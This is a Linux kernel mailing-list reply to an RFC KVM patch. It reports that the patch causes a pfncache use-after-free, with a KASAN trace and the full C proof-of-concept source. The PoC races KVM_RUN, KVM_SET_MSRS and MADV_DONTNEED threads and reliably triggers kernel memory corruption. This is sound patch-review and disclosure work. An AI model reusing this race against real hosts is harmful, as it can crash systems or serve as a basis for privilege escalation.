Received: from out203-205-221-209.mail.qq.com (out203-205-221-209.mail.qq.com [203.205.221.209])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 41E08846F
	for <kvmarm@lists.linux.dev>; Sun, 21 Jun 2026 00:02:51 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=203.205.221.209
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782000173; cv=none; b=bU+X+yk95ipK4a1FmfF8WeeJXcat3/uKbfgN6fXb4paWW0wHY7lUVZvSS/RE7ioAnBnJn64Q0eHQct41oEFp7GLM+K0jy/Hksm+HoPIv7zfXsonTj/48VoUIOxoImiLLXXqsXUt0uZDsL8MEDJoxZ+OABI58M7fLDaAQ3Mc2p7Q=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782000173; c=relaxed/simple;
	bh=HyKubDTu0Cyf1xKZy02ECMnsDNZoTq80wAa77x2Vp5Y=;
	h=Message-ID:Date:MIME-Version:Subject:To:References:From:
	 In-Reply-To:Content-Type; b=sGIMUEslxAuTYIPTK2u4AAkvPT+S122XlI9ecKFWkxDzmumAAi3mXK+QCt1wLc/7/t41OmqUL+ItT1BDYFoGSjlcniZmjRLNXC5S/lx3wd39f2BcZKFt0059NHG7r8UPTHmxW2WpbM5Kx72AqAjI5lcvE6kakYY1c0qYBu7fZk4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=L2VjciTU; arc=none smtp.client-ip=203.205.221.209
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="L2VjciTU"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1782000168; bh=vybCqDg9hWmZlNrhFz29JdNO2ituUhIKv68GCKK1pIE=;
	h=Date:Subject:To:References:From:In-Reply-To;
	b=L2VjciTUQaPakfGZjn9TxPFCaiK97akAD4B6vblO2QYtVpoS7KNK/l4d3h9Lk0ja2
	 0Mfh3bsHHaz01eZaA0if+Sm7/KMfM6yNhxY1T5G3bt523RfF2iTUbP1spW1lGk9lEV
	 l/ywrVL1RiVhqn5Ukf04QG6JYyp2RghNaHMaNEWQ=
Received: from [192.168.1.100] ([183.95.73.181])
	by newxmesmtplogicsvrsza63-0.qq.com (NewEsmtp) with SMTP
	id ADA4832; Sun, 21 Jun 2026 08:02:45 +0800
X-QQ-mid: xmsmtpt1782000165ts5upz1q4
Message-ID: <tencent_EFE0DC1B0750A4CB1C783F920F91CF10E309@qq.com>
X-QQ-XMAILINFO: Nwte6vbuj0EqbknLZeEA4uc//0lXfg3aCZT28xlvppfzvfRWlcS17m5Mv2gmnM
	 yDijvPooVf/2FSfVkWqbuVR4B6lQKTfdLQzfp/3lmlnYr55GHc1zdoenps6igG7+wnz0VELYEQTM
	 /8e6Q4YtZCRzB83F8wnyyfd5RWqIrtV2efZLPqoButCTNfZA1j5zMPzv9NhP8HbWbybBzu1ClL98
	 35sQomuc4SVH1lyY/DauVxfPJ2MbcrhS+fLrj0pubS0LkhX8uasdW1v4iV1eRzOU+AcPDrF0Jnsi
	 uffGkxJW0OevkWmfWJ6tlqnHq4OKXjn8QIceLhsWQnLYHi8yAbApjBdXMBz/K6veY/13d5vjwQ1n
	 WsmyK0jizKud5tdMvlpsUFjGhpS2sIxzc6FfIksFsTxRZlJ02F4BQ0230IXXPpPn2vVPxXbcKZY2
	 GkyuQnt49LKiSJNvVWnOC27q2/1awSHyo2X2hIPvUoeRSSnaSnATTlMnlb8NYJMISWrR8qZmbxb8
	 y37fvr6Xzms2A8N3jsKZ4I9JqJfaQVK88ynLr6XylkTHQupj9HwlZrJP1TBPtScCS1IHUbzsEoeI
	 jYlK5cyDwGLs26M0sPILMeCwKDFUAgzBtoLcBVoT/y4V97pZq1afnLuHOhN5OsLosGcTwP+TyJGt
	 Ni7e/ZTdAaRVNPAANXK5CQCNvlUro+HzSylBQYy/ZGFDKJ9K9+NpPCMCqqrjJi8lJ4w43cBY7cYR
	 Gse+RGbXFQ+Fn5oLJfZgZRKievzzUDMHlHarzLhHXkA6QNcqURmcnKOwkIBVk39L10gulYmh7xlB
	 McL/vMhpcPV6ECBYqcCU0Nr+rc3K7u6SBxsb8vA3Myvx5ehGHZfA7CNu+zOUKp3OmiB0NEnDCBXW
	 iOenuq/yrrSJ257zWmw4/SNXAaZyHrW2KnqjJUfhpXip+6sz6shAhskTXGWxIxE6pwD0xpUfFGjm
	 Y87B21fcqpCL3TZHeiu4292tyHcuiIqVOlxkIAbu5nqzYBxzpY0hfFOfv8ISjN5QxjU7Gz/6wxmr
	 iGYXyUwgxDM5qajlmPmIWhWlxarJ6RPa4hRNhhOa6H/hOETGSI
X-QQ-XMRINFO: MSVp+SPm3vtSI1QTLgDHQqIV1w2oNKDqfg==
X-OQ-MSGID: <4babccaf-90b5-4bf6-8f82-7e5677fef024@qq.com>
Date: Sun, 21 Jun 2026 08:02:45 +0800
Precedence: bulk
X-Mailing-List: kvmarm@lists.linux.dev
List-Id: <kvmarm.lists.linux.dev>
List-Subscribe: <mailto:kvmarm+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:kvmarm+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [RFC PATCH] KVM: Ignore MMU notifiers for guest_memfd-only
 memslots
To: Alexandru Elisei <alexandru.elisei@arm.com>, pbonzini@redhat.com,
 kvm@vger.kernel.org, linux-kernel@vger.kernel.org, maz@kernel.org,
 oupton@kernel.org, suzuki.poulose@arm.com, kvmarm@lists.linux.dev,
 linux-arm-kernel@lists.infradead.org, seanjc@google.com,
 david.hildenbrand@arm.com, mark.rutland@arm.com
References: <20260615155244.183044-1-alexandru.elisei@arm.com>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <20260615155244.183044-1-alexandru.elisei@arm.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Hi

I came across the Sashiko review in this thread and wanted to see if
the pfncache UAF could be triggered in practice.  The short answer is:
yes, it reproduces reliably with a multi-threaded PoC.  Below is the
KASAN report and a brief description of the reproducer.

On Mon, Jun 15, 2026 at 04:52:44PM +0100, Alexandru Elisei wrote:
 > For guest_memfd-only memslots (kvm_memslot_is_gmem_only() is true), the
 > memory provider for the virtual machine is the guest_memfd file, not the
 > userspace mapping.
...
 > @@ -592,6 +592,10 @@ static __always_inline kvm_mn_ret_t 
kvm_handle_hva_range(struct kvm *kvm,
 >              unsigned long hva_start, hva_end;
 >
 >              slot = container_of(node, struct kvm_memory_slot, 
hva_node[slots->node_idx]);
 > +
 > +            if (kvm_slot_has_gmem(slot) && 
kvm_memslot_is_gmem_only(slot))
 > +                continue;
 > +

This `continue` is the problem.  When the only memslot covering the
HVA range is gmem-only, found_memslot stays false, and in
invalidate_range_end, kvm_mmu_invalidate_end() is never called.
That means mmu_invalidate_seq never increments.

Meanwhile, the pfncache (used for guest pvclock) runs this retry
protocol in hva_to_pfn_retry():

     1. Capture mmu_seq
     2. Drop gpc->lock
     3. GUP + kmap (gets a page reference, creates kernel mapping)
     4. kvm_release_page_clean(page) — drops the reference
     5. Re-acquire gpc->lock
     6. mmu_notifier_retry_cache() — checks if mmu_seq changed

If step 6 sees the same seq, the stale kmap is kept even though the
page was freed after step 4.  This is the UAF.

[Reproduction]

I rebuilt the kernel with CONFIG_KASAN=y and ran the PoC in a QEMU VM.
The trigger is three threads racing concurrently:

   - Thread 1 (T0): hammers KVM_RUN ioctls, forcing
     kvm_guest_time_update → kvm_gpc_refresh → hva_to_pfn_retry
   - Thread 2 (T1): cycles KVM_SET_MSRS to activate/deactivate the
     pvclock pfncache, extending the race window
   - Thread 3 (T2): hammers MADV_DONTNEED + write on the HVA, firing
     MMU notifier invalidations while the memslot is gmem-only

The full PoC source (poc.c) is attached at the end of this mail.
Compiled with: gcc -o poc poc.c -static -lpthread

[KASAN report — kernel 7.1.0-g0eb81d7f81ae #1, CONFIG_KASAN=y]

   ==================================================================
   BUG: KASAN: use-after-free in kvm_setup_guest_pvclock+0x632/0x680
   Read of size 4 at addr ffff888116069000 by task poc/9520

   CPU: 1 UID: 0 PID: 9520 Comm: poc Not tainted 7.1.0-g0eb81d7f81ae #1

   Call Trace:
    <TASK>
    dump_stack_lvl+0x116/0x1f0
    print_report+0xf4/0x600
    kasan_report+0xe0/0x110
    kvm_setup_guest_pvclock+0x632/0x680
    kvm_guest_time_update+0x741/0x1090
    vcpu_run+0x1c2a/0x5a80
    kvm_arch_vcpu_ioctl_run+0x1029/0x18d0
    kvm_vcpu_ioctl+0x772/0x1710
    __x64_sys_ioctl+0x193/0x210           ← KVM_RUN
    do_syscall_64+0x129/0x880
    entry_SYSCALL_64_after_hwframe+0x77/0x7f

   The buggy address belongs to the physical page:
   page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x7ff24ab46

   page last allocated via:
    get_user_pages_unlocked → hva_to_pfn → __kvm_gpc_refresh
      → kvm_gpc_refresh → kvm_setup_guest_pvclock

   page last free pid 9520 tgid 9517 stack trace:
    kvm_release_page_clean → __folio_put → __free_frozen_pages
      ← __kvm_gpc_refresh ← kvm_gpc_refresh

The allocation and free traces confirm the exact scenario from the
review: the page is allocated by GUP during gpc refresh, then freed by
kvm_release_page_clean() inside the same __kvm_gpc_refresh() call,
and then kvm_setup_guest_pvclock still accesses it through the stale
kmap.

The crash reproduces within ~40 seconds of the PoC running.

[Full PoC source]

Compile: gcc -o poc poc.c -static -lpthread

// SPDX-License-Identifier: GPL-2.0-only
/*
  * PoC for: KVM MMU notifier skip regression for guest_memfd-only memslots
  *
  * Concurrent threads create a race between gpc refresh (GUP → kmap →
  * kvm_release_page_clean → retry check) and MMU invalidation (munmap /
  * MADV_DONTNEED) on a gmem-only memslot where the invalidation doesn't
  * increment mmu_invalidate_seq.
  */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <pthread.h>
#include <linux/kvm.h>

#ifndef KVM_CAP_GUEST_MEMFD
#define KVM_CAP_GUEST_MEMFD 234
#endif
#ifndef GUEST_MEMFD_FLAG_MMAP
#define GUEST_MEMFD_FLAG_MMAP (1ULL << 0)
#endif
#ifndef MSR_KVM_SYSTEM_TIME_NEW
#define MSR_KVM_SYSTEM_TIME_NEW 0x4b564d01
#endif

#define PAGE_SIZE 4096

static volatile bool stop = false;
static int vcpu_fd = -1;
static unsigned long shared_hva = 0;

static void sigint_handler(int sig) { stop = true; }

static void *worker_thread(void *arg)
{
     int tid = (int)(long)arg;
     for (int i = 0; !stop && i < 200000; i++) {
         if (tid == 0)
             ioctl(vcpu_fd, KVM_RUN, 0);
         else if (tid == 1) {
             struct kvm_msrs *msrs = malloc(sizeof(*msrs) + 
sizeof(msrs->entries[0]));
             if (msrs) {
                 memset(msrs, 0, sizeof(*msrs) + sizeof(msrs->entries[0]));
                 msrs->nmsrs = 1;
                 msrs->entries[0].index = MSR_KVM_SYSTEM_TIME_NEW;
                 msrs->entries[0].data = (i & 1) ? 0x1001 : 0x1000;
                 ioctl(vcpu_fd, KVM_SET_MSRS, msrs);
                 free(msrs);
             }
         } else {
             madvise((void*)shared_hva, PAGE_SIZE, MADV_DONTNEED);
             *(volatile char*)shared_hva = 0x42;
         }
         if (i % 50000 == 0)
             printf("[T%d] %d iterations\n", tid, i);
     }
     printf("[T%d] Done\n", tid);
     return NULL;
}

int main(void)
{
     signal(SIGINT, sigint_handler);
     signal(SIGTERM, sigint_handler);

     int kvm_fd = open("/dev/kvm", O_RDWR);
     int vm_fd = ioctl(kvm_fd, KVM_CREATE_VM, 0);

     struct kvm_create_guest_memfd gmem_cmd = { .size = PAGE_SIZE, 
.flags = GUEST_MEMFD_FLAG_MMAP };
     int gmem_fd = ioctl(vm_fd, KVM_CREATE_GUEST_MEMFD, &gmem_cmd);

     void *anon = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE,
                       MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
     memset(anon, 0xAA, PAGE_SIZE);
     shared_hva = (unsigned long)anon;

     struct kvm_userspace_memory_region2 mem = {
         .slot = 0, .flags = KVM_MEM_GUEST_MEMFD,
         .guest_phys_addr = 0x1000, .memory_size = PAGE_SIZE,
         .userspace_addr = shared_hva,
         .guest_memfd_offset = 0, .guest_memfd = gmem_fd,
     };
     ioctl(vm_fd, KVM_SET_USER_MEMORY_REGION2, &mem);

     vcpu_fd = ioctl(vm_fd, KVM_CREATE_VCPU, 0);
     size_t mmap_size = ioctl(kvm_fd, KVM_GET_VCPU_MMAP_SIZE, 0);
     struct kvm_run *vcpu_run = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE,
                                     MAP_SHARED, vcpu_fd, 0);

     /* Pre-activate pfncache via MSR */
     struct kvm_msrs *msrs = malloc(sizeof(*msrs) + 
sizeof(msrs->entries[0]));
     memset(msrs, 0, sizeof(*msrs) + sizeof(msrs->entries[0]));
     msrs->nmsrs = 1;
     msrs->entries[0].index = MSR_KVM_SYSTEM_TIME_NEW;
     msrs->entries[0].data = 0x1001;
     ioctl(vcpu_fd, KVM_SET_MSRS, msrs);
     free(msrs);

     pthread_t threads[3];
     for (int i = 0; i < 3; i++)
         pthread_create(&threads[i], NULL, worker_thread, (void *)(long)i);

     sleep(40);
     stop = true;
     for (int i = 0; i < 3; i++)
         pthread_join(threads[i], NULL);

     printf("[*] Done. Check dmesg for KASAN UAF.\n");
     return 0;
}

Thanks,
XIAOWU


